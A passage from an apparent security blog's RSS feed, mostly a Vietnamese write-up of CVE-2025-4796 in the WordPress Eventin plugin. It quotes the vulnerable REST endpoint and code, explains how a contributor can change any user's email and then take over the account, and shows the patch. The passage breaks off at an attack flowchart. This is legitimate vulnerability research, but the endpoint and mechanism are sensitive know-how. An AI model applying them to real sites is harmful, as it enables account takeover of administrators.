0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Bypass Vulnerability&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/simple-payment/vulnerability/wordpress-simple-payment-plugin-1-3-6-2-3-8-authentication-bypass-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Simple Payment Plugin 1.3.6-2.3.8 is vulnerable to a high priority Bypass Vulnerability&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-4796 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-12-cve-2025-4796/</link>
      <pubDate>Mon, 12 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-12-cve-2025-4796/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-12-cve-2025-4796/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Eventin&lt;/strong&gt; cho WordPress &lt;strong&gt;d·ªÖ b·ªã leo thang ƒë·∫∑c quy·ªÅn&lt;/strong&gt; th√¥ng qua &lt;strong&gt;chi·∫øm quy·ªÅn t√†i kho·∫£n&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n &lt;strong&gt;t·ª´ tr∆∞·ªõc ƒë·∫øn v√† bao g·ªìm 4.0.34&lt;/strong&gt;. Nguy√™n nh√¢n l√† do plugin &lt;strong&gt;kh√¥ng x√°c th·ª±c ƒë√∫ng danh t√≠nh ho·∫∑c quy·ªÅn h·∫°n c·ªßa ng∆∞·ªùi d√πng&lt;/strong&gt; tr∆∞·ªõc khi c·∫≠p nh·∫≠t th√¥ng tin nh∆∞ &lt;strong&gt;email&lt;/strong&gt; trong h√†m &lt;strong&gt;&lt;code&gt;Eventin\Speaker\Api\SpeakerController::update_item&lt;/code&gt;&lt;/strong&gt;. ƒêi·ªÅu n√†y cho ph√©p &lt;strong&gt;k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c&lt;/strong&gt; nh∆∞ng c√≥ &lt;strong&gt;quy·ªÅn contributor tr·ªü l√™n&lt;/strong&gt; c√≥ th·ªÉ &lt;strong&gt;thay ƒë·ªïi ƒë·ªãa ch·ªâ email c·ªßa b·∫•t k·ª≥ ng∆∞·ªùi d√πng n√†o&lt;/strong&gt;, bao g·ªìm c·∫£ &lt;strong&gt;qu·∫£n tr·ªã vi√™n&lt;/strong&gt;, t·ª´ ƒë√≥ &lt;strong&gt;ƒë·∫∑t l·∫°i m·∫≠t kh·∫©u&lt;/strong&gt; v√† &lt;strong&gt;chi·∫øm quy·ªÅn truy c·∫≠p t√†i kho·∫£n&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-4796&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-4796&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: 4.0.34&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.0.35&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (8.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wp-event-solution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Eventin Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Eventin&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.0.34&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.0.35&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt API nh∆∞ sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route(&#xA;    $this-&amp;gt;namespace, // &amp;#39;eventin/v2&amp;#39;&#xA;    &amp;#39;/&amp;#39; . $this-&amp;gt;rest_base . &amp;#39;/(?P&amp;lt;id&amp;gt;[\d]&amp;#43;)&amp;#39;, // &amp;#39;speakers&amp;#39;&#xA;    array(&#xA;        &amp;#39;args&amp;#39; =&amp;gt; array(&#xA;            &amp;#39;id&amp;#39; =&amp;gt; array(&#xA;                &amp;#39;description&amp;#39; =&amp;gt; __( &amp;#39;Unique identifier for the post.&amp;#39;, &amp;#39;eventin&amp;#39; ),&#xA;                &amp;#39;type&amp;#39;        =&amp;gt; &amp;#39;integer&amp;#39;,&#xA;            ),&#xA;        ),&#xA;        array(&#xA;            &amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::EDITABLE, // POST, PUT, PATCH&#xA;            &amp;#39;callback&amp;#39;            =&amp;gt; array( $this, &amp;#39;update_item&amp;#39; ),&#xA;            &amp;#39;permission_callback&amp;#39; =&amp;gt; array( $this, &amp;#39;update_item_permissions_check&amp;#39; ),&#xA;            &amp;#39;args&amp;#39;                =&amp;gt; $this-&amp;gt;get_collection_params(),&#xA;        ),&#xA;        ...&#xA;    ),&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;V·ªõi c·∫•u h√¨nh tr√™n:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$this-&amp;gt;namespace&lt;/code&gt; = &lt;strong&gt;&lt;code&gt;eventin/v2&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$this-&amp;gt;rest_base&lt;/code&gt; = &lt;strong&gt;&lt;code&gt;speakers&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;(?P&amp;lt;id&amp;gt;[\d]+)&lt;/code&gt; = &lt;strong&gt;tham s·ªë ID d·∫°ng s·ªë&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;API endpoint ƒë·∫ßy ƒë·ªß s·∫Ω c√≥ d·∫°ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-json/eventin/v2/speakers/{id}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi c√≥ request ƒë·∫øn endpoint tr√™n v·ªõi method h·ª£p l·ªá th√¨ callback &lt;code&gt;update_item&lt;/code&gt; nh∆∞ng tr∆∞·ªõc h·∫øt c·∫ßn v∆∞·ª£t qua h√†m ki·ªÉm tra quy·ªÅn &lt;code&gt;update_item_permissions_check&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function update_item_permissions_check( $request ) {&#xA;    return current_user_can( &amp;#39;etn_manage_organizer&amp;#39; )&#xA;                || current_user_can( &amp;#39;etn_manage_event&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m s·∫Ω cho ph√©p request ƒëi ti·∫øp (&lt;code&gt;return true&lt;/code&gt;) n·∫øu user hi·ªán t·∫°i c√≥ m·ªôt trong hai quy·ªÅn: &lt;code&gt;etn_manage_organizer&lt;/code&gt; ho·∫∑c &lt;code&gt;etn_manage_event&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi search v·ªõi t·ª´ kh√≥a &lt;code&gt;etn_manage_organizer&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-12-cve-2025-4796/search.png&#34; title=&#34;Search&#34; data-thumbnail=&#34;/posts/2026-01-12-cve-2025-4796/search.png&#34; data-sub-html=&#34;&lt;h2&gt;Search&lt;/h2&gt;&lt;p&gt;Search&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-12-cve-2025-4796/search.png&#39; alt=&#34;Search&#34; height=&#34;870&#34; width=&#34;1340&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Search&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta th·∫•y role contributor c≈©ng ƒë∆∞·ª£c g√°n 2 quy·ªÅn n√†y&lt;/p&gt;&#xA;&lt;p&gt;=&amp;gt; Endpoint n√†y d√†nh cho ng∆∞·ªùi d√πng c√≥ role &lt;strong&gt;Contributor&lt;/strong&gt; tr·ªü l√™n.&lt;/p&gt;&#xA;&lt;p&gt;H√†m &lt;code&gt;update_item&lt;/code&gt; ƒë∆∞·ª£c g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function update_item( $request ) {&#xA;    $data = $this-&amp;gt;prepare_item_for_database( $request );&#xA;&#xA;    if ( is_wp_error( $data ) ) {&#xA;        return $data;&#xA;    }&#xA;&#xA;    $speaker = new User_Model( $request[&amp;#39;id&amp;#39;] );&#xA;    ...&#xA;    $updated = $speaker-&amp;gt;update( $data );&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m s·∫Ω g·ªçi ƒë·∫øn &lt;strong&gt;&lt;code&gt;prepare_item_for_database()&lt;/code&gt;&lt;/strong&gt; ƒë·ªÉ th·ª±c hi·ªán c√°c b∆∞·ªõc &lt;strong&gt;chu·∫©n b·ªã d·ªØ li·ªáu c·∫ßn thi·∫øt tr∆∞·ªõc khi ti·∫øn h√†nh thao t√°c t·∫°o m·ªõi ho·∫∑c c·∫≠p nh·∫≠t&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function prepare_item_for_database( $request ) {&#xA;    $prepared_data = [];&#xA;    $input_data    = json_decode( $request-&amp;gt;get_body(), true );&#xA;&#xA;    if ( ! empty( $input_data[&amp;#39;id&amp;#39;] ) ) {&#xA;        $prepared_data[&amp;#39;id&amp;#39;] = intval( $input_data[&amp;#39;id&amp;#39;] );&#xA;    }&#xA;&#xA;    if ( ! empty( $input_data[&amp;#39;name&amp;#39;] ) ) {&#xA;        $prepared_data[&amp;#39;etn_speaker_title&amp;#39;] = sanitize_text_field( $input_data[&amp;#39;name&amp;#39;] );&#xA;        $prepared_data[&amp;#39;display_name&amp;#39;]      = sanitize_text_field( $input_data[&amp;#39;name&amp;#39;] );&#xA;    }&#xA;    &#xA;&#xA;    if ( ! empty( $input_data[&amp;#39;email&amp;#39;] ) ) {&#xA;        $prepared_data[&amp;#39;etn_speaker_website_email&amp;#39;] = sanitize_text_field( $input_data[&amp;#39;email&amp;#39;] );&#xA;        $prepared_data[&amp;#39;user_login&amp;#39;]                = sanitize_email( $input_data[&amp;#39;email&amp;#39;] );&#xA;    }&#xA;&#xA;&#xA;    if ( ! empty( $input_data[&amp;#39;social&amp;#39;] ) ) {&#xA;        $prepared_data[&amp;#39;etn_speaker_social&amp;#39;] = $input_data[&amp;#39;social&amp;#39;] ;&#xA;    }&#xA;&#xA;&#xA;    if ( ! empty( $input_data[&amp;#39;category&amp;#39;] ) &amp;amp;&amp;amp; is_array( $input_data[&amp;#39;category&amp;#39;] ) ) {&#xA;        $allowed_categories = [&amp;#39;speaker&amp;#39;, &amp;#39;organizer&amp;#39;];&#xA;        $filtered_categories = array_intersect( $input_data[&amp;#39;category&amp;#39;], $allowed_categories );&#xA;    &#xA;        if ( ! empty( $filtered_categories ) ) {&#xA;            $prepared_data[&amp;#39;etn_speaker_category&amp;#39;] = $filtered_categories;&#xA;        } else {&#xA;            unset( $prepared_data[&amp;#39;etn_speaker_category&amp;#39;] ); // Or you can leave it out entirely&#xA;        }&#xA;    }       &#xA;    &#xA;    if ( ! empty( $input_data[&amp;#39;speaker_group&amp;#39;] ) ) {&#xA;        $prepared_data[&amp;#39;etn_speaker_group&amp;#39;] =  $input_data[&amp;#39;speaker_group&amp;#39;] ? json_encode($input_data[&amp;#39;speaker_group&amp;#39;]) : json_encode([]);&#xA;    }        &#xA;    &#xA;        &#xA;    //non mandatory field&#xA;    $prepared_data[&amp;#39;date&amp;#39;]                      =  $input_data[&amp;#39;date&amp;#39;] ? $input_data[&amp;#39;date&amp;#39;] : date(&amp;#34;Y-m-d H:i:s&amp;#34;);&#xA;    $prepared_data[&amp;#39;etn_speaker_designation&amp;#39;]   = ! empty( $input_data[&amp;#39;designation&amp;#39;] ) ? sanitize_text_field( $input_data[&amp;#39;designation&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $prepared_data[&amp;#39;etn_company_name&amp;#39;]          = ! empty( $input_data[&amp;#39;company_name&amp;#39;] ) ? sanitize_text_field( $input_data[&amp;#39;company_name&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $prepared_data[&amp;#39;etn_speaker_url&amp;#39;]           = ! empty( $input_data[&amp;#39;company_url&amp;#39;] ) ? sanitize_url( $input_data[&amp;#39;company_url&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $prepared_data[&amp;#39;etn_speaker_summery&amp;#39;]       = ! empty( $input_data[&amp;#39;summary&amp;#39;] ) ? wp_kses_post( $input_data[&amp;#39;summary&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $prepared_data[&amp;#39;image&amp;#39;]                     = ! empty( $input_data[&amp;#39;image&amp;#39;] ) ? sanitize_url( $input_data[&amp;#39;image&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $prepared_data[&amp;#39;image_id&amp;#39;]                  = ! empty( $input_data[&amp;#39;image_id&amp;#39;] ) ? intval( $input_data[&amp;#39;image_id&amp;#39;] ) : attachment_url_to_postid( $input_data[&amp;#39;image&amp;#39;] );&#xA;    $prepared_data[&amp;#39;etn_speaker_company_logo&amp;#39;]  = ! empty( $input_data[&amp;#39;company_logo&amp;#39;] ) ? sanitize_url( $input_data[&amp;#39;company_logo&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $prepared_data[&amp;#39;etn_company_logo_id&amp;#39;]       = ! empty( $input_data[&amp;#39;company_logo_id&amp;#39;] ) ? intval( $input_data[&amp;#39;company_logo_id&amp;#39;] ): attachment_url_to_postid( $input_data[&amp;#39;company_logo&amp;#39;] );&#xA;&#xA;&#xA;    if ( isset( $input_data[&amp;#39;hide_user&amp;#39;] ) ) {&#xA;        $prepared_data[&amp;#39;hide_user&amp;#39;] = $input_data[&amp;#39;hide_user&amp;#39;];&#xA;    }&#xA;    &#xA;    return $prepared_data;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;strong&gt;&lt;code&gt;prepare_item_for_database()&lt;/code&gt;&lt;/strong&gt; d√πng ƒë·ªÉ &lt;strong&gt;decode JSON t·ª´ body request, sanitize v√† chu·∫©n h√≥a d·ªØ li·ªáu, map c√°c tr∆∞·ªùng c·∫ßn thi·∫øt sang c·∫•u tr√∫c n·ªôi b·ªô, sau ƒë√≥ tr·∫£ v·ªÅ m·∫£ng d·ªØ li·ªáu ƒë·ªÉ ph·ª•c v·ª• vi·ªác t·∫°o ho·∫∑c c·∫≠p nh·∫≠t speaker trong database&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Sau ƒë√≥ h√†m &lt;code&gt;update_item&lt;/code&gt; kh·ªüi t·∫°o speaker theo &lt;code&gt;$request[&#39;id&#39;]&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;G·ªçi &lt;code&gt;$speaker-&amp;gt;update($data)&lt;/code&gt; ƒë·ªÉ ghi d·ªØ li·ªáu ƒë√£ chu·∫©n h√≥a v√†o database, c·∫≠p nh·∫≠t th√¥ng tin speaker.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function update( $args = [] ) {&#xA;    $user = get_userdata($this-&amp;gt;id);&#xA;    ...&#xA;    $email = !empty($args[&amp;#39;etn_speaker_website_email&amp;#39;]) ? $args[&amp;#39;etn_speaker_website_email&amp;#39;] : &amp;#39;&amp;#39;;&#xA;&#xA;    $user_data = $user-&amp;gt;to_array();&#xA;    ...&#xA;    if ( $email ) {&#xA;        $user_data[&amp;#39;user_email&amp;#39;] = $email;&#xA;    }&#xA;&#xA;    ...&#xA;    $user_id = wp_update_user( $user_data );&#xA;&#xA;    ...&#xA;    return $user_id;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;strong&gt;&lt;code&gt;update()&lt;/code&gt;&lt;/strong&gt; l·∫•y th√¥ng tin user theo &lt;strong&gt;ID ƒë∆∞·ª£c truy·ªÅn t·ª´ request&lt;/strong&gt;, chuy·ªÉn d·ªØ li·ªáu user sang m·∫£ng, sau ƒë√≥ &lt;strong&gt;ghi ƒë√® tr∆∞·ªùng &lt;code&gt;user_email&lt;/code&gt; n·∫øu c√≥ gi√° tr·ªã m·ªõi&lt;/strong&gt; v√† g·ªçi &lt;strong&gt;&lt;code&gt;wp_update_user()&lt;/code&gt;&lt;/strong&gt; ƒë·ªÉ c·∫≠p nh·∫≠t tr·ª±c ti·∫øp d·ªØ li·ªáu user trong h·ªá th·ªëng.&lt;/p&gt;&#xA;&lt;p&gt;Do &lt;strong&gt;ID v√† email ƒë·ªÅu c√≥ th·ªÉ b·ªã ki·ªÉm so√°t t·ª´ request&lt;/strong&gt;, to√†n b·ªô lu·ªìng c·∫≠p nh·∫≠t c√≥ th·ªÉ b·ªã attacker l·ª£i d·ª•ng ƒë·ªÉ &lt;strong&gt;thay ƒë·ªïi email c·ªßa b·∫•t k·ª≥ user n√†o&lt;/strong&gt;. Khi email c·ªßa n·∫°n nh√¢n (v√≠ d·ª• admin) b·ªã ƒë·ªïi sang email do attacker ki·ªÉm so√°t, attacker ch·ªâ c·∫ßn th·ª±c hi·ªán ch·ª©c nƒÉng &lt;strong&gt;reset m·∫≠t kh·∫©u&lt;/strong&gt; ƒë·ªÉ &lt;strong&gt;chi·∫øm quy·ªÅn t√†i kho·∫£n (Account Takeover)&lt;/strong&gt;, t·ª´ ƒë√≥ d·∫´n ƒë·∫øn &lt;strong&gt;Privilege Escalation&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° &lt;code&gt;v4.0.35&lt;/code&gt; b·ªï sung c√°c ki·ªÉm so√°t sau trong h√†m &lt;code&gt;update_item&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$target_user_id = (int) $request-&amp;gt;get_param(&amp;#39;id&amp;#39;);&#xA;$target_user    = get_userdata($target_user_id);&#xA;&#xA;// Validate user t·ªìn t·∫°i&#xA;if ( ! $target_user ) {&#xA;    return new WP_Error(&amp;#39;user_not_found&amp;#39;, &amp;#39;User does not exist&amp;#39;, [&amp;#39;status&amp;#39; =&amp;gt; 404]);&#xA;}&#xA;&#xA;// Ki·ªÉm tra quy·ªÅn ch·ªânh s·ª≠a user&#xA;if ( ! current_user_can( &amp;#39;edit_user&amp;#39;, $target_user_id ) ) {&#xA;    return new WP_Error(&amp;#39;forbidden&amp;#39;, &amp;#39;forbidden&amp;#39;, [&amp;#39;status&amp;#39; =&amp;gt; 403]);&#xA;}&#xA;&#xA;// Ch·ªâ cho ph√©p ch·ªânh s·ª≠a speaker / organizer&#xA;if (&#xA;    ! in_array(&amp;#39;etn-speaker&amp;#39;, (array) $target_user-&amp;gt;roles, true) &amp;amp;&amp;amp;&#xA;    ! in_array(&amp;#39;etn-organizer&amp;#39;, (array) $target_user-&amp;gt;roles, true)&#xA;) {&#xA;    return new WP_Error(&amp;#39;forbidden&amp;#39;, &amp;#39;forbidden&amp;#39;, [&amp;#39;status&amp;#39; =&amp;gt; 403]);&#xA;}&#xA;&#xA;// Ch·∫∑n c·∫≠p nh·∫≠t c√°c role nh·∫°y c·∫£m&#xA;if (&#xA;    in_array(&amp;#39;administrator&amp;#39;, (array) $target_user-&amp;gt;roles, true) ||&#xA;    in_array(&amp;#39;editor&amp;#39;, (array) $target_user-&amp;gt;roles, true) ||&#xA;    in_array(&amp;#39;author&amp;#39;, (array) $target_user-&amp;gt;roles, true) ||&#xA;    in_array(&amp;#39;contributor&amp;#39;, (array) $target_user-&amp;gt;roles, true) ||&#xA;    in_array(&amp;#39;subscriber&amp;#39;, (array) $target_user-&amp;gt;roles, true) ||&#xA;    in_array(&amp;#39;etn-customer&amp;#39;, (array) $target_user-&amp;gt;roles, true)&#xA;) {&#xA;    return new WP_Error(&amp;#39;forbidden&amp;#39;, &amp;#39;forbidden&amp;#39;, [&amp;#39;status&amp;#39; =&amp;gt; 403]);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;C√°c ki·ªÉm tra n√†y ƒë·∫£m b·∫£o &lt;strong&gt;ch·ªâ user h·ª£p l·ªá m·ªõi ƒë∆∞·ª£c ph√©p c·∫≠p nh·∫≠t speaker/organizer&lt;/strong&gt;, ngƒÉn ch·∫∑n vi·ªác &lt;strong&gt;s·ª≠a email tr√°i ph√©p v√† chi·∫øm quy·ªÅn t√†i kho·∫£n&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Attacker (Authenticated ‚Äì Contributor)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Access Speaker edit page in Eventin admin 